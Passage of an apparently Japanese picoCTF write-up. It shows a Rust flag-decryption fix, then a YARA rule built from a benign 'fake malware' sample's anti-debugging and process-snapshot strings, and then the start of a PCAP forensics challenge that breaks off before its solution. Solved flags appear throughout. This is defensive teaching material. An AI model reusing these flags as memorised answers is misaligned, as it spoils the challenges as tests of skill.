+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="o">&amp;</span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="n">decrypted_slice</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">    </span><span class="c1">// }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Encrypted flag values
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">hex_values</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;45&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;54&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;76&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;12&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;90&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;53&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;01&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;35&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;59&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f6&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;03&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;86&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;56&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;29&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;6f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;08&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;c3&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;61&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f9&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;35&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Convert the hexadecimal strings to bytes and collect them into a vector
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex_values</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">hex</span><span class="o">|</span><span class="w"> </span><span class="kt">u8</span>::<span class="n">from_str_radix</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">).</span><span class="n">unwrap</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">party_foul</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;Using memory unsafe languages is a: &#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">party_foul</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<br />
+<p>以下が修正後。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="hl"><span class="lnt">22
+</span></span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="hl"><span class="lnt">34
+</span></span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">xor_cryptor</span>::<span class="n">XORCryptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span>: <span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="nb">String</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Key for decryption
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;CSUCKS&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Editing our borrowed value
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&#34;PARTY FOUL! Here is your flag: &#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Create decryption object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XORCryptor</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">is_err</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">xrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Did you know you have to do &#34;unsafe operations in Rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="c1">// https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="c1">// Even though we have these memory safe languages, sometimes we need to do things outside of the rules
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="c1">// This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    
+</span></span></span><span class="line hl"><span class="cl"><span class="w">    </span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Decrypt the flag operations 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xrc</span><span class="p">.</span><span class="n">decrypt_vec</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Creating a pointer 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="p">.</span><span class="n">as_ptr</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="p">.</span><span class="n">len</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Unsafe operation: calling an unsafe function that dereferences a raw pointer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_slice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span>::<span class="n">slice</span>::<span class="n">from_raw_parts</span><span class="p">(</span><span class="n">decrypted_ptr</span><span class="p">,</span><span class="w"> </span><span class="n">decrypted_len</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="o">&amp;</span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="n">decrypted_slice</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Encrypted flag values
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">hex_values</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;45&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;54&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;76&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;12&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;90&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;53&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;01&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;35&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;59&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f6&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;03&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;86&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;56&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;29&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;6f&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;08&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;c3&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;61&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f9&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;35&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Convert the hexadecimal strings to bytes and collect them into a vector
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex_values</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">hex</span><span class="o">|</span><span class="w"> </span><span class="kt">u8</span>::<span class="n">from_str_radix</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">).</span><span class="n">unwrap</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">party_foul</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;Using memory unsafe languages is a: &#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">party_foul</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<p>実行結果。</p>
+<pre>
+$ cargo run --release --bin rust_proj
+   Compiling crossbeam-utils v0.8.20
+   Compiling rayon-core v1.12.1
+   Compiling either v1.13.0
+   Compiling crossbeam-epoch v0.9.18
+   Compiling crossbeam-deque v0.8.5
+   Compiling rayon v1.10.0
+   Compiling xor_cryptor v1.2.3
+   Compiling rust_proj v0.1.0 (/mnt/hgfs/Mac_Downloads/fixme3)
+    Finished `release` profile [optimized] target(s) in 2.36s
+     Running `target/release/rust_proj`
+Using memory unsafe languages is a: PARTY FOUL! Here is your flag: picoCTF{n0w_y0uv3_f1x3d_1h3m_411}
+</pre>
+<br />
+<p>Flag: <code>picoCTF{n0w_y0uv3_f1x3d_1h3m_411}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="general-skills-yararules0x100-200-points">[General Skills]: YaraRules0x100 (200 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Dear Threat Intelligence Analyst,<br />
+Quick heads up - we stumbled upon a shady executable file on one of our employee&rsquo;s Windows PCs. Good news: the employee didn&rsquo;t take the bait and flagged it to our InfoSec crew.<br />
+Seems like this file sneaked past our Intrusion Detection Systems, indicating a fresh threat with no matching signatures in our database.<br />
+Can you dive into this file and whip up some YARA rules? We need to make sure we catch this thing if it pops up again.<br />
+Thanks a bunch!<br />
+The suspicious file can be downloaded here. Unzip the archive with the password picoctf<br />
+Once you have created the YARA rule/signature, submit your rule file as follows:<br />
+socat -t60 - TCP:standard-pizzas.picoctf.net:51964 &lt; sample.txt<br />
+(In the above command, modify &ldquo;sample.txt&rdquo; to whatever filename you use).<br />
+When you submit your rule, it will undergo testing with various test cases. If it successfully passes all the test cases, you&rsquo;ll receive your flag.<br />
+<br /><br />
+Hint1: The test cases will attempt to match your rule with various variations of this suspicious file, including a packed version, an unpacked version, slight modifications to the file while retaining functionality, etc.
+<br /><br />
+Hint2: Since this is a Windows executable file, some strings within this binary can be &ldquo;wide&rdquo; strings. Try declaring your string variables something like $str = &ldquo;Some Text&rdquo; wide ascii wherever necessary.
+<br /><br />
+Hint3: Your rule should also not generate any false positives (or false negatives). Refine your rule to perfection! One YARA rule file can have multiple rules! Maybe define one rule for Packed binary and another rule for Unpacked binary in the same rule file?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>suspicious.exe</li>
+</ul>
+<br />
+<h3 id="solution-3">Solution</h3>
+<p>まずは <code>file</code> コマンドを実行。UPX で Pack されているのがわかります。</p>
+<pre>
+$ file suspicious.exe
+suspicious.exe: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed
+</pre>
+<br />
+<p>UPXを検知する yara rule はググったら見つかります。</p>
+<p><a href="https://github.com/godaddy/yara-rules/blob/master/packers/upx.yara">https://github.com/godaddy/yara-rules/blob/master/packers/upx.yara</a></p>
+<p><br /><br /></p>
+<p>テスト</p>
+<pre>
+$ yara -r YaraRules0x100.yar .
+upx ./suspicious.exe
+</pre>
+<p><br /><br /></p>
+<p>とりあえず、この Rule だけでどういう結果が得られるか見てみます。</p>
+<pre>
+$ socat -t60 - TCP:standard-pizzas.picoctf.net:51964 < YaraRules0x100.yar
+:::::
+
+Status: Failed
+False Negatives Check: Testcase failed. Your rule generated a false negative.
+False Positives Check: Testcases passed!
+Stats: 62 testcase(s) passed. 1 failed. 1 testcase(s) unchecked. 64 total testcases.
+Pass all the testcases to get the flag.
+
+:::::
+</pre>
+<br />
+False Negativeがあるので、UPX で Pack されていないもの（つまり、Unpackされたもの）が1つあるみたいです。
+<p>Hintでも、そのことに触れられていましたね。</p>
+<p><br /><br /></p>
+<p>Unpack をして、ユニークな文字列を探してみます。</p>
+<pre>
+$ upx -d suspicious.exe -o unpacked_suspicious.exe
+
+$ strings -a -e l unpacked_suspicious.exe
+jjjjjj
+jjjj
+ntdll.dll
+(Ignore) error related to Ntdll. Falling back.
+[FATAL ERROR] CreateToolhelp32Snapshot failed.
+[FATAL ERROR] OpenProcessToken failed.
+SeDebugPrivilege
+[FATAL ERROR] LookupPrivilegeValue failed.
+[FATAL ERROR] AdjustTokenPrivileges failed.
+Please run this program as an Admin.
+[FATAL ERROR] Failed to create the Mutex.
+[ERROR] Exactly two arguments expected by the Child process. Exiting...
+Check if the program is already running.
+Error converting WChar to Char.
+No debugger was present. Exiting successfully.
+Error opening a handle to debuggerPID.
+Debugger process terminated successfully.
+Failed to terminate the debugger process.
+[FATAL ERROR]  Unable to create the child process.
+Something went wrong.
+The debugger was detected but our process wasn't able to fight it. Exiting the program.
+Our process detected the debugger and was able to fight it. Don't be surprised if the debugger crashed.
+picoCTF
+This is a fake malware. It means no harm.
+Hints:
+- To develop an effective YARA rule, find any suspicious Win32 API functions that are being used by this program.
+- Developing rules solely based on strings (excluding URLs, library function calls, etc.) is not a good idea, as it can lead to false positives.
+- Your rules should work even if this binary is packed (or unpacked).
+Good luck!
+Oops! Debugger Detected. Fake malware will try to hide itself (but not really).
+Error creating the thread. Exiting...
+&File
+iE&xit
+&Help
+h&About ...
+About Suspicious
+MS Shell Dlg
+Created by Nandan Desai
+Copyright (c) 2023
+Suspicious
+SUSPICIOUS
+</pre>
+<br />
+<p>上記の <code>strings</code> コマンドの出力結果の中に、別の Hint が出てきています。（以下の部分）</p>
+<pre>
+Hints:
+- To develop an effective YARA rule, find any suspicious Win32 API functions that are being used by this program.
+- Developing rules solely based on strings (excluding URLs, library function calls, etc.) is not a good idea, as it can lead to false positives.
+- Your rules should work even if this binary is packed (or unpacked).
+</pre>
+<br />
+<p>ここからは、トライ アンド エラーでした。人によって回答が違うと思います。</p>
+<br />
+<p>以下が、フラグが取れたときの Yara Rule です。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">rule</span> <span class="n">upx</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">meta</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">description</span> <span class="o">=</span> <span class="s">&#34;UPX packed file&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">block</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">        <span class="n">quarantine</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nl">strings</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">mz</span> <span class="o">=</span> <span class="s">&#34;MZ&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">upx1</span> <span class="o">=</span> <span class="p">{</span><span class="mi">55505830000000</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">upx2</span> <span class="o">=</span> <span class="p">{</span><span class="mi">55505831000000</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">upx_sig</span> <span class="o">=</span> <span class="s">&#34;UPX!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nl">condition</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">mz</span> <span class="n">at</span> <span class="mi">0</span> <span class="n">and</span> <span class="err">$</span><span class="n">upx1</span> <span class="nf">in</span> <span class="p">(</span><span class="mf">0..1024</span><span class="p">)</span> <span class="n">and</span> <span class="err">$</span><span class="n">upx2</span> <span class="nf">in</span> <span class="p">(</span><span class="mf">0..1024</span><span class="p">)</span> <span class="n">and</span> <span class="err">$</span><span class="n">upx_sig</span> <span class="nf">in</span> <span class="p">(</span><span class="mf">0..1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rule</span> <span class="n">YaraRules0x100</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">meta</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">description</span> <span class="o">=</span> <span class="s">&#34;str check&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nl">strings</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">a</span> <span class="o">=</span> <span class="s">&#34;CreateToolhelp32Snapshot&#34;</span> <span class="n">wide</span> <span class="n">ascii</span>
+</span></span><span class="line"><span class="cl">	<span class="err">$</span><span class="n">b</span> <span class="o">=</span> <span class="s">&#34;Debugger Detected&#34;</span> <span class="n">wide</span> <span class="n">ascii</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">upx_sig</span> <span class="o">=</span> <span class="s">&#34;UPX!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nl">condition</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="err">$</span><span class="n">a</span> <span class="n">and</span> <span class="err">$</span><span class="n">b</span> <span class="n">and</span> <span class="n">not</span> <span class="err">$</span><span class="n">upx_sig</span> <span class="nf">in</span> <span class="p">(</span><span class="mf">0..1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br />
+<p><code>rule upx</code> は、githubにあったコードをそのまま使用。</p>
+<p><code>rule YaraRules0x100</code> の方では、suspicious Win32 API functions を２つチェックし、かつ Unpack されたもの（UPXで Pack されていないもの）をチェックしています。</p>
+<br />
+<pre>
+$ socat -t60 - TCP:standard-pizzas.picoctf.net:50087 < YaraRules0x100.yar
+:::::
+
+Status: Passed
+Congrats! Here is your flag: picoCTF{yara_rul35_r0ckzzz_12a4da12}
+
+:::::
+</pre>
+<br />
+<p>Flag: <code>picoCTF{yara_rul35_r0ckzzz_12a4da12}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-ph4nt0m-1ntrud3r-50-points">[Forensics]: Ph4nt0m 1ntrud3r (50 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>A digital ghost has breached my defenses, and my sensitive data has been stolen! 😱💻 Your mission is to uncover how this phantom intruder infiltrated my system and retrieve the hidden flag.<br />
+To solve this challenge, you&rsquo;ll need to analyze the provided PCAP file and track down the attack method. The attacker has cleverly concealed his moves in well timely manner. Dive into the network traffic, apply the right filters and show off your forensic prowess and unmask the digital intruder!<br />
+Find the PCAP file here Network Traffic PCAP file and try to get the flag.
+<br /><br />
+Hint1: Filter your packets to narrow down your search.
+<br /><br />
+Hint2: Attacks were done in timely manner.
+<br /><br />
+Hint3: Time is essential</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>myNetworkTraffic.pcap</li>
+</ul>
+<br />
+<h3 id="solution-4">Solution</h3>
